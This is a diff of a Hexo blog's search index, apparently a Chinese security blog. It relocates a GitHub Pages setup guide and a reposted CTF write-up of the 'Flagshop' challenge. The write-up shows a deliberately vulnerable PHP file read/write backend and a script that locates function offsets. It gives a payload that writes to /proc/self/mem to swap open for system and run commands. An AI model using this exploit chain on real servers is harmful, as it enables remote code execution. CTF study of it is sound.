@@ -1,6 +1,91 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HEXO+Githubpage搭建博客</title>
+    <url>//articles/1558f80b43.html</url>
+    <content><![CDATA[<h2 id="Github新建项目"><a href="#Github新建项目" class="headerlink" title="Github新建项目"></a>Github新建项目</h2><ul>
+<li>这个项目命名方式为:<code>&lt;用户名&gt;.github.io</code> 如下图</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668210563706.png" alt></p>
+<ul>
+<li>打开项目页面选择<code>Clone or download</code>点击<code>Use SSH</code></li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668211846352.png" alt></p>
+<ul>
+<li>复制SSH地址如下图</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/1566821283557.png" alt></p>
+<h2 id="创建SSH公钥"><a href="#创建SSH公钥" class="headerlink" title="创建SSH公钥"></a>创建SSH公钥</h2><pre><code class="shell">ssh-keygen -t rsa -b 4096 -C &quot;你的邮箱@qq.com&quot;
+ssh-add ~/.ssh/id_rsa</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668227842615.png" alt></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668229504873.png" alt></p>
+<ul>
+<li>查看key</li>
+</ul>
+<pre><code>cd /root/.ssh
+cat id_rsa.pub</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668231662963.png" alt></p>
+<ul>
+<li>github创建SSH-KEY,将创建的key值复制上去,保存即可</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668233457778.png" alt></p>
+<ul>
+<li>添加github用户上传用户信息</li>
+</ul>
+<pre><code class="shell">git config --global user.name &quot;你的用户名&quot;
+git config --global user.email “你的邮箱&quot;</code></pre>
+<h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><pre><code>apt install npm</code></pre><h2 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a>安装HEXO</h2><pre><code class="shell">npm install -g hexo
+npm install hexo --save
+hexo -v #查看安装是否成功，成功显示版本信息如下图</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668238496198.png" alt></p>
+<h2 id="生成一个博客"><a href="#生成一个博客" class="headerlink" title="生成一个博客"></a>生成一个博客</h2><pre><code class="shell">hexo init &lt;文件夹&gt;
+#如：hexo init myblog</code></pre>
+<p>命令执行后会生成一个文件夹里面是博客文件。下一步进入文件夹，执行<code>hexo g</code>即可生成静态文件再执行<code>hexo s</code>,即可本地预览博客</p>
+<pre><code>hexo g
+hexo s</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668241705588.png" alt></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668242397730.png" alt="img"></p>
+<h2 id="跟换主题"><a href="#跟换主题" class="headerlink" title="跟换主题"></a>跟换主题</h2><p>官方主题网站：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
+<p>找到喜欢的主题，到github搜索，直接clone到主题文件夹下。</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668244631639.png" alt="img"></p>
+<p>复制文件名，修改博客文件夹下的<code>_config.yml</code></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668245176334.png" alt="img"></p>
+<p>themes修改为刚刚克隆下来的文件夹名</p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668246396496.png" alt="img"></p>
+<p><code>hexo g 、hexo s</code>本地查看一下效果</p>
+<h2 id="上传至github"><a href="#上传至github" class="headerlink" title="上传至github"></a>上传至github</h2><ul>
+<li>安装git插件</li>
+</ul>
+<pre><code>npm install hexo-deployer-git --save</code></pre><ul>
+<li>修改<code>_config.yml</code>最后为下图，其中repo修改为第一步git项目的ssh地址</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668249164392.png" alt="img"></p>
+<ul>
+<li>上传至github</li>
+</ul>
+<pre><code>hexo g
+hexo d</code></pre><p>打开设置好的项目域名即可查看效果</p>
+<h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>将markdown文章放到博客根目录的source/_post下执行<code>hexo g</code>和<code>hexo d</code></p>
+<p>或者hexo new  “文章名”，但是md文件必须遵循下面格式：</p>
+<p>文章头加上如下代码</p>
+<pre><code class="markdown">---
+
+title: Python沙箱逃逸学习笔记
+
+date: 2019-08-15 12:51:44
+
+tags: CTF
+
+---</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668253185151.png" alt="img"></p>
+<h2 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h2><p>直接把文件删除再次执行<code>hexo g</code>和<code>hexo d</code></p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hash长度扩展攻击学习笔记</title>
     <url>//articles/1559adf164.html</url>
     <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p> <a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">实验吧：让我进去</a></p>
@@ -426,91 +511,6 @@ f.close()
       </categories>
       <tags>
         <tag>WriteUp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HEXO+Githubpage搭建博客</title>
-    <url>//articles/1558f80b43.html</url>
-    <content><![CDATA[<h2 id="Github新建项目"><a href="#Github新建项目" class="headerlink" title="Github新建项目"></a>Github新建项目</h2><ul>
-<li>这个项目命名方式为:<code>&lt;用户名&gt;.github.io</code> 如下图</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668210563706.png" alt></p>
-<ul>
-<li>打开项目页面选择<code>Clone or download</code>点击<code>Use SSH</code></li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668211846352.png" alt></p>
-<ul>
-<li>复制SSH地址如下图</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/1566821283557.png" alt></p>
-<h2 id="创建SSH公钥"><a href="#创建SSH公钥" class="headerlink" title="创建SSH公钥"></a>创建SSH公钥</h2><pre><code class="shell">ssh-keygen -t rsa -b 4096 -C &quot;你的邮箱@qq.com&quot;
-ssh-add ~/.ssh/id_rsa</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668227842615.png" alt></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668229504873.png" alt></p>
-<ul>
-<li>查看key</li>
-</ul>
-<pre><code>cd /root/.ssh
-cat id_rsa.pub</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668231662963.png" alt></p>
-<ul>
-<li>github创建SSH-KEY,将创建的key值复制上去,保存即可</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668233457778.png" alt></p>
-<ul>
-<li>添加github用户上传用户信息</li>
-</ul>
-<pre><code class="shell">git config --global user.name &quot;你的用户名&quot;
-git config --global user.email “你的邮箱&quot;</code></pre>
-<h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><pre><code>apt install npm</code></pre><h2 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a>安装HEXO</h2><pre><code class="shell">npm install -g hexo
-npm install hexo --save
-hexo -v #查看安装是否成功，成功显示版本信息如下图</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668238496198.png" alt></p>
-<h2 id="生成一个博客"><a href="#生成一个博客" class="headerlink" title="生成一个博客"></a>生成一个博客</h2><pre><code class="shell">hexo init &lt;文件夹&gt;
-#如：hexo init myblog</code></pre>
-<p>命令执行后会生成一个文件夹里面是博客文件。下一步进入文件夹，执行<code>hexo g</code>即可生成静态文件再执行<code>hexo s</code>,即可本地预览博客</p>
-<pre><code>hexo g
-hexo s</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668241705588.png" alt></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668242397730.png" alt="img"></p>
-<h2 id="跟换主题"><a href="#跟换主题" class="headerlink" title="跟换主题"></a>跟换主题</h2><p>官方主题网站：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
-<p>找到喜欢的主题，到github搜索，直接clone到主题文件夹下。</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668244631639.png" alt="img"></p>
-<p>复制文件名，修改博客文件夹下的<code>_config.yml</code></p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668245176334.png" alt="img"></p>
-<p>themes修改为刚刚克隆下来的文件夹名</p>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668246396496.png" alt="img"></p>
-<p><code>hexo g 、hexo s</code>本地查看一下效果</p>
-<h2 id="上传至github"><a href="#上传至github" class="headerlink" title="上传至github"></a>上传至github</h2><ul>
-<li>安装git插件</li>
-</ul>
-<pre><code>npm install hexo-deployer-git --save</code></pre><ul>
-<li>修改<code>_config.yml</code>最后为下图，其中repo修改为第一步git项目的ssh地址</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668249164392.png" alt="img"></p>
-<ul>
-<li>上传至github</li>
-</ul>
-<pre><code>hexo g
-hexo d</code></pre><p>打开设置好的项目域名即可查看效果</p>
-<h2 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h2><p>将markdown文章放到博客根目录的source/_post下执行<code>hexo g</code>和<code>hexo d</code></p>
-<p>或者hexo new  “文章名”，但是md文件必须遵循下面格式：</p>
-<p>文章头加上如下代码</p>
-<pre><code class="markdown">---
-
-title: Python沙箱逃逸学习笔记
-
-date: 2019-08-15 12:51:44
-
-tags: CTF
-
----</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/mycute/20190826/15668253185151.png" alt="img"></p>
-<h2 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h2><p>直接把文件删除再次执行<code>hexo g</code>和<code>hexo d</code></p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>随笔</tag>
       </tags>
   </entry>
   <entry>
@@ -4805,6 +4805,198 @@ Get-DecryptedCpassword &quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;</
       </tags>
   </entry>
   <entry>
+    <title>【转载西湖论剑 Flagshop 分析复现</title>
+    <url>//articles/d5a07c1f3f.html</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
+<li>(文章首发于合天智汇)比赛时候没能做出来，其实这道题就是一道pwn题。</li>
+</ul>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><ul>
+<li>抓包或者看源码就会发现有一个SSRF，但是没有权限读flag，测试发现存在一个readflag的elf文件。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-112129@2x.png" alt="WX20201013-112129@2x"></p>
+<ul>
+<li>读取题目全部源码：</li>
+</ul>
+<blockquote>
+<p>backend.php</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+
+$offset = isset($_GET[&#39;offset&#39;]) ? $_GET[&#39;offset&#39;] : 0;
+$buffer = isset($_GET[&#39;buffer&#39;]) ? $_GET[&#39;buffer&#39;] : &quot;&quot;;
+
+if (isset($_GET[&#39;writefile&#39;])) {
+    $fp = fopen($_GET[&#39;writefile&#39;], &quot;a&quot;);
+    fseek($fp, $offset);
+    fwrite($fp, $buffer);
+    fclose($fp);
+}
+
+if (isset($_GET[&#39;readfile&#39;])) {
+    echo file_get_contents($_GET[&#39;readfile&#39;]);
+}
+?&gt;</code></pre>
+<blockquote>
+<p>index.php</p>
+</blockquote>
+<pre><code class="php">&lt;?php
+
+if(!isset($_COOKIE[&#39;sandbox&#39;])) {
+  $uuid = system(&quot;/var/www/html/copy&quot;);
+  setcookie(&quot;sandbox&quot;, $uuid);
+  header(&quot;Location: sandbox/&quot;.$uuid);
+} else {
+  header(&quot;Location: sandbox/&quot;.$_COOKIE[&#39;sandbox&#39;]);
+}</code></pre>
+<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><ul>
+<li>从源码可以知道，这里是存在一个文件写入的问题，但是测试和对copy这个elf文件反编译发现，网站根目录是没有写入权限的。但是测试发现tmp目录是可写的。</li>
+<li>做到这里基本没思路了。后面看了下Nul1的wp,发现这就是这道pwn题改的。(<a href="https://www.pianshen.com/article/4537767804/" target="_blank" rel="noopener">https://www.pianshen.com/article/4537767804/</a>)</li>
+</ul>
+<h3 id="内存泄露和动态链接库"><a href="#内存泄露和动态链接库" class="headerlink" title="内存泄露和动态链接库"></a>内存泄露和动态链接库</h3><blockquote>
+<p> /proc/self/maps</p>
+<p> 包含了当前进程映射的内存区域以及他们的访问权限.文件格式如下:</p>
+</blockquote>
+<pre><code class="shell">address           perms offset  dev   inode   pathname
+08048000-08056000 r-xp 00000000 03:0c 64593   /usr/sbin/gpm
+08056000-08058000 rw-p 0000d000 03:0c 64593   /usr/sbin/gpm
+08058000-0805b000 rwxp 00000000 00:00 0
+40000000-40013000 r-xp 00000000 03:0c 4165    /lib/ld-2.2.4.so
+40013000-40015000 rw-p 00012000 03:0c 4165    /lib/ld-2.2.4.so
+4001f000-40135000 r-xp 00000000 03:0c 45494   /lib/libc-2.2.4.so
+40135000-4013e000 rw-p 00115000 03:0c 45494   /lib/libc-2.2.4.so
+4013e000-40142000 rw-p 00000000 00:00 0
+bffff000-c0000000 rwxp 00000000 00:00 0</code></pre>
+<ul>
+<li>通过SSRF漏洞直接读取<code>/proc/self/maps</code>来泄露当前程序调用的到动态链接库和内存地址。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-114932@2x.png" alt="WX20201013-114932@2x"></p>
+<ul>
+<li>直接把/lib/x86_64-linux-gnu/libc-2.19.so通过SSRF读取然后下载下来，通过readelf来查看system的地址。可以得知system函数的偏移是：<code>0x0000000000046590</code></li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-115346@2x.png" alt="WX20201013-115346@2x"></p>
+<ul>
+<li>我们将动态链接库的地址加上<code>system</code>的偏移就能计算出<code>system</code>函数的地址。</li>
+</ul>
+<pre><code class="php">&lt;?php
+echo dechex(0x7ffff5f40000+0x0000000000046590);
+//system函数结果：0x7ffff5f86590
+?&gt;</code></pre>
+<h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><ul>
+<li><p>我们知道system函数的地址，我们就可以将open函数的地址替换为<code>system</code>函数的地址，我们在<code>file_get_contents</code>传入参数为系统命令实际执行的却是system函数，这样我们将readflag的结果输出到文件，或者反弹shell。这样我们下一步就是要计算open函数在二进制文件中的实际偏移，最后直接修改内存。</p>
+</li>
+<li><p>这里需要用到<code>/proc/self/exe</code></p>
+</li>
+</ul>
+<blockquote>
+<p>在Linux2.2的内核及其之后,/proc/pid/exe是直接执行的二进制文件的符号链接.这个符号链接能够被取消.尝试打开这个文件就相当与打开了二进制文件,甚至可以通过重新输入/proc/pid/exe重新运行一个对应于pid的二进制文件.在一个多线程的程序中,如果主线程已经退出了,就无法访问这个符号链接.</p>
+<p>在Linux2.0及其之前,/proc/pid/exe是指向当前进程执行的二进制文件.</p>
+</blockquote>
+<ul>
+<li>同样我们之间将其搞下来，用下面脚本来计算open函数的偏移。</li>
+</ul>
+<pre><code class="php">&lt;?php
+function packlli($value) {
+    $higher = ($value &amp; 0xffffffff00000000) &gt;&gt; 32;
+    $lower = $value &amp; 0x00000000ffffffff;
+    return pack(&#39;V2&#39;, $lower, $higher);
+}
+
+function unp($value) {
+    return hexdec(bin2hex(strrev($value)));
+}
+function parseelf($bin_ver, $rela = false) {
+    $bin = file_get_contents($bin_ver);
+    $e_shoff = unp(substr($bin, 0x28, 8));
+    $e_shentsize = unp(substr($bin, 0x3a, 2));
+    $e_shnum = unp(substr($bin, 0x3c, 2));
+    $e_shstrndx = unp(substr($bin, 0x3e, 2));
+
+    for($i = 0; $i &lt; $e_shnum; $i += 1) {
+        $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
+        if($sh_type == 11) { // SHT_DYNSYM 
+            $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
+            $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
+            $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
+        }
+        elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB
+            $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
+            $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
+        }
+        elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA
+            $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
+            $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
+            $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
+        }
+    }
+
+    if($rela) {
+        for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
+            $r_offset = unp(substr($bin, $i, 8));
+            $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32;
+            $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
+            $name = &#39;&#39;;
+            $j = $strtab_off + $name_off - 1;
+            while($bin[++$j] != &quot;\0&quot;) {
+                $name .= $bin[$j];
+
+            }
+
+            if($name == &#39;open&#39;) {
+                return $r_offset;
+            }
+        }
+    }
+    else {
+        for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
+            $name_off = unp(substr($bin, $i, 4));
+            $name = &#39;&#39;;
+            $j = $strtab_off + $name_off - 1;
+            while($bin[++$j] != &quot;\0&quot;) {
+                $name .= $bin[$j];
+            }
+            if($name == &#39;__libc_system&#39;) {
+                $system_offset = unp(substr($bin, $i + 8, 8));
+            }
+            if($name == &#39;__open&#39;) {
+                $open_offset = unp(substr($bin, $i + 8, 8));
+            }
+        }
+        return array($system_offset, $open_offset);
+    }
+}
+$open_php = parseelf(&#39;exe&#39;, true);
+//$maps = file_get_contents(&#39;lib.txt&#39;);
+//$pie_base =(hexdec(explode(&#39;-&#39;, $maps)[0]));
+echo $open_php;
+//结果：15333784
+?&gt;</code></pre>
+<h3 id="修改进程内存"><a href="#修改进程内存" class="headerlink" title="修改进程内存"></a>修改进程内存</h3><blockquote>
+<p>/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p>
+</blockquote>
+<ul>
+<li><p>也就是说我们刚才从maps和动态链接库计算出system的地址需要修改mem来使得open的地址变成system的地址。既然我们偏移地址和文件偏移都算出来了直接构造payload即可。</p>
+<pre><code>backend.php?readfile=/readflag&gt;/tmp/i_o_u_hlq&amp;writefile=/proc/self/mem&amp;buffer=%90%65%f8%f5%ff%7f&amp;offset=15333784</code></pre></li>
+<li><p>直接读取<code>/tmp/i_o_u_hlq</code>就可以直接<code>getflag</code></p>
+</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG2879.png" alt="WechatIMG2879"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><p>Nu1L 西湖论剑wp</p>
+</li>
+<li><p><a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">https://blog.spoock.com/2019/10/08/proc/</a></p>
+</li>
+<li><p><a href="https://www.pianshen.com/article/4537767804/" target="_blank" rel="noopener">https://www.pianshen.com/article/4537767804/</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GKCTF2020-CheckIN</title>
     <url>//articles/d5c12b792b.html</url>
     <content><![CDATA[<p>base64加密一下可以直接RCE：</p>
@@ -8582,198 +8774,6 @@ public $file = &quot;php://filter/convert.base64-decode/resource=aaa.php&quot;;
 $a = new GWHT;
 $a-&gt;hero = new Yongen;
 echo urlencode(serialize($a));</code></pre>
-]]></content>
-      <categories>
-        <category>CTF比赛</category>
-      </categories>
-      <tags>
-        <tag>WriteUp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>\[转载\]西湖论剑 Flagshop 分析复现</title>
-    <url>//articles/d5a07c1f3f.html</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
-<li>(文章首发于合天智汇)比赛时候没能做出来，其实这道题就是一道pwn题。</li>
-</ul>
-<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><ul>
-<li>抓包或者看源码就会发现有一个SSRF，但是没有权限读flag，测试发现存在一个readflag的elf文件。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-112129@2x.png" alt="WX20201013-112129@2x"></p>
-<ul>
-<li>读取题目全部源码：</li>
-</ul>
-<blockquote>
-<p>backend.php</p>
-</blockquote>
-<pre><code class="php">&lt;?php
-
-$offset = isset($_GET[&#39;offset&#39;]) ? $_GET[&#39;offset&#39;] : 0;
-$buffer = isset($_GET[&#39;buffer&#39;]) ? $_GET[&#39;buffer&#39;] : &quot;&quot;;
-
-if (isset($_GET[&#39;writefile&#39;])) {
-    $fp = fopen($_GET[&#39;writefile&#39;], &quot;a&quot;);
-    fseek($fp, $offset);
-    fwrite($fp, $buffer);
-    fclose($fp);
-}
-
-if (isset($_GET[&#39;readfile&#39;])) {
-    echo file_get_contents($_GET[&#39;readfile&#39;]);
-}
-?&gt;</code></pre>
-<blockquote>
-<p>index.php</p>
-</blockquote>
-<pre><code class="php">&lt;?php
-
-if(!isset($_COOKIE[&#39;sandbox&#39;])) {
-  $uuid = system(&quot;/var/www/html/copy&quot;);
-  setcookie(&quot;sandbox&quot;, $uuid);
-  header(&quot;Location: sandbox/&quot;.$uuid);
-} else {
-  header(&quot;Location: sandbox/&quot;.$_COOKIE[&#39;sandbox&#39;]);
-}</code></pre>
-<h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><ul>
-<li>从源码可以知道，这里是存在一个文件写入的问题，但是测试和对copy这个elf文件反编译发现，网站根目录是没有写入权限的。但是测试发现tmp目录是可写的。</li>
-<li>做到这里基本没思路了。后面看了下Nul1的wp,发现这就是这道pwn题改的。(<a href="https://www.pianshen.com/article/4537767804/" target="_blank" rel="noopener">https://www.pianshen.com/article/4537767804/</a>)</li>
-</ul>
-<h3 id="内存泄露和动态链接库"><a href="#内存泄露和动态链接库" class="headerlink" title="内存泄露和动态链接库"></a>内存泄露和动态链接库</h3><blockquote>
-<p> /proc/self/maps</p>
-<p> 包含了当前进程映射的内存区域以及他们的访问权限.文件格式如下:</p>
-</blockquote>
-<pre><code class="shell">address           perms offset  dev   inode   pathname
-08048000-08056000 r-xp 00000000 03:0c 64593   /usr/sbin/gpm
-08056000-08058000 rw-p 0000d000 03:0c 64593   /usr/sbin/gpm
-08058000-0805b000 rwxp 00000000 00:00 0
-40000000-40013000 r-xp 00000000 03:0c 4165    /lib/ld-2.2.4.so
-40013000-40015000 rw-p 00012000 03:0c 4165    /lib/ld-2.2.4.so
-4001f000-40135000 r-xp 00000000 03:0c 45494   /lib/libc-2.2.4.so
-40135000-4013e000 rw-p 00115000 03:0c 45494   /lib/libc-2.2.4.so
-4013e000-40142000 rw-p 00000000 00:00 0
-bffff000-c0000000 rwxp 00000000 00:00 0</code></pre>
-<ul>
-<li>通过SSRF漏洞直接读取<code>/proc/self/maps</code>来泄露当前程序调用的到动态链接库和内存地址。</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-114932@2x.png" alt="WX20201013-114932@2x"></p>
-<ul>
-<li>直接把/lib/x86_64-linux-gnu/libc-2.19.so通过SSRF读取然后下载下来，通过readelf来查看system的地址。可以得知system函数的偏移是：<code>0x0000000000046590</code></li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201013-115346@2x.png" alt="WX20201013-115346@2x"></p>
-<ul>
-<li>我们将动态链接库的地址加上<code>system</code>的偏移就能计算出<code>system</code>函数的地址。</li>
-</ul>
-<pre><code class="php">&lt;?php
-echo dechex(0x7ffff5f40000+0x0000000000046590);
-//system函数结果：0x7ffff5f86590
-?&gt;</code></pre>
-<h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><ul>
-<li><p>我们知道system函数的地址，我们就可以将open函数的地址替换为<code>system</code>函数的地址，我们在<code>file_get_contents</code>传入参数为系统命令实际执行的却是system函数，这样我们将readflag的结果输出到文件，或者反弹shell。这样我们下一步就是要计算open函数在二进制文件中的实际偏移，最后直接修改内存。</p>
-</li>
-<li><p>这里需要用到<code>/proc/self/exe</code></p>
-</li>
-</ul>
-<blockquote>
-<p>在Linux2.2的内核及其之后,/proc/pid/exe是直接执行的二进制文件的符号链接.这个符号链接能够被取消.尝试打开这个文件就相当与打开了二进制文件,甚至可以通过重新输入/proc/pid/exe重新运行一个对应于pid的二进制文件.在一个多线程的程序中,如果主线程已经退出了,就无法访问这个符号链接.</p>
-<p>在Linux2.0及其之前,/proc/pid/exe是指向当前进程执行的二进制文件.</p>
-</blockquote>
-<ul>
-<li>同样我们之间将其搞下来，用下面脚本来计算open函数的偏移。</li>
-</ul>
-<pre><code class="php">&lt;?php
-function packlli($value) {
-    $higher = ($value &amp; 0xffffffff00000000) &gt;&gt; 32;
-    $lower = $value &amp; 0x00000000ffffffff;
-    return pack(&#39;V2&#39;, $lower, $higher);
-}
-
-function unp($value) {
-    return hexdec(bin2hex(strrev($value)));
-}
-function parseelf($bin_ver, $rela = false) {
-    $bin = file_get_contents($bin_ver);
-    $e_shoff = unp(substr($bin, 0x28, 8));
-    $e_shentsize = unp(substr($bin, 0x3a, 2));
-    $e_shnum = unp(substr($bin, 0x3c, 2));
-    $e_shstrndx = unp(substr($bin, 0x3e, 2));
-
-    for($i = 0; $i &lt; $e_shnum; $i += 1) {
-        $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
-        if($sh_type == 11) { // SHT_DYNSYM 
-            $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
-            $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
-            $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
-        }
-        elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB
-            $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
-            $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
-        }
-        elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA
-            $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
-            $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
-            $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
-        }
-    }
-
-    if($rela) {
-        for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
-            $r_offset = unp(substr($bin, $i, 8));
-            $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32;
-            $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
-            $name = &#39;&#39;;
-            $j = $strtab_off + $name_off - 1;
-            while($bin[++$j] != &quot;\0&quot;) {
-                $name .= $bin[$j];
-
-            }
-
-            if($name == &#39;open&#39;) {
-                return $r_offset;
-            }
-        }
-    }
-    else {
-        for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
-            $name_off = unp(substr($bin, $i, 4));
-            $name = &#39;&#39;;
-            $j = $strtab_off + $name_off - 1;
-            while($bin[++$j] != &quot;\0&quot;) {
-                $name .= $bin[$j];
-            }
-            if($name == &#39;__libc_system&#39;) {
-                $system_offset = unp(substr($bin, $i + 8, 8));
-            }
-            if($name == &#39;__open&#39;) {
-                $open_offset = unp(substr($bin, $i + 8, 8));
-            }
-        }
-        return array($system_offset, $open_offset);
-    }
-}
-$open_php = parseelf(&#39;exe&#39;, true);
-//$maps = file_get_contents(&#39;lib.txt&#39;);
-//$pie_base =(hexdec(explode(&#39;-&#39;, $maps)[0]));
-echo $open_php;
-//结果：15333784
-?&gt;</code></pre>
-<h3 id="修改进程内存"><a href="#修改进程内存" class="headerlink" title="修改进程内存"></a>修改进程内存</h3><blockquote>
-<p>/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p>
-</blockquote>
-<ul>
-<li><p>也就是说我们刚才从maps和动态链接库计算出system的地址需要修改mem来使得open的地址变成system的地址。既然我们偏移地址和文件偏移都算出来了直接构造payload即可。</p>
